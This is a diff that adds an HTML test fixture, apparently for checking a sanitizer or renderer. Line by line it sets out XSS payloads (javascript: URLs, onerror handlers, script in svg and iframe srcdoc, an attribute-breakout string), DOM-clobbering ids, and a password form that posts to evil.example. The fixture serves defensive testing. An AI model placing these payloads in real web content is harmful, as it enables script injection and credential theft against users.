@@ -1,0 +1,18 @@
+<p data-kyomi-url="javascript:alert(1)" data-kyomi-embed="youtube">A paragraph carrying forged compiler hints.</p>
+<kyomi-embed data-kyomi-url="https://evil.example/">A forged compiler element.</kyomi-embed>
+<pre data-kyomi-lang="&quot;&gt;&lt;img src=x onerror=alert(1)&gt;"><code>forged language hint</code></pre>
+<h2 id="location">Clobbering location</h2>
+<h2 id="__proto__">Clobbering proto</h2>
+<a name="cookie">named anchor</a>
+<img src="https://hostile.example/ok.png" srcset="javascript:alert(1) 1x, https://hostile.example/ok2.png 2x" onerror="alert(1)" alt="ok">
+<video src="https://hostile.example/v.mp4" poster="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;" autoplay></video>
+<p><a href="javascript:alert(1)">script link</a> and <a href="#location">fragment link</a>.</p>
+<math><semantics><mi>x</mi><annotation-xml encoding="text/html"><img src="x" onerror="alert(1)"></annotation-xml></semantics></math>
+<math><maction actiontype="statusline"><mi>y</mi><mtext>status text</mtext></maction></math>
+<svg><script>alert(1)</script><text>svg label text</text></svg>
+<form action="https://evil.example/collect"><input name="password"><button>Send credentials</button></form>
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
+<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/y.swf">
+<style>body { display: none }</style>
+<p style="position: fixed; inset: 0">An overlay attempt.</p>
+<p>The end of the hostile fixture.</p>
